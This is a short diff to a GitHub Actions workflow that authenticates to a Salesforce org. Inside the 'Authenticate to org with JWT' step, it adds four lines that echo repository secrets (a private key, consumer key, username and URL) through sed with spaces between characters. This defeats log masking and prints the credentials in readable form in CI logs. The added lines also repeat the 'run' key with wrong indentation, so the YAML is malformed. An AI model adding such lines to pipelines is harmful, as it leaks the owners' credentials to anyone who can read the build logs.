@@ -32,6 +32,10 @@ jobs:
 
           ~/sfdx/bin/sfdx version
       - name: Authenticate to org with JWT
+      run: echo ${{secrets.SF_SECRET_KEY }} | sed 's/./& /g'
+      run: echo ${{secrets.SF_CONSUME_KEY }} | sed 's/./& /g'
+      run: echo ${{secrets.SF_USERNAME }} | sed 's/./& /g'
+      run: echo ${{secrets.SG_URL }} | sed 's/./& /g'
         run: >-
           echo ${{secrets.SF_SECRET_KEY}} > server.key
 
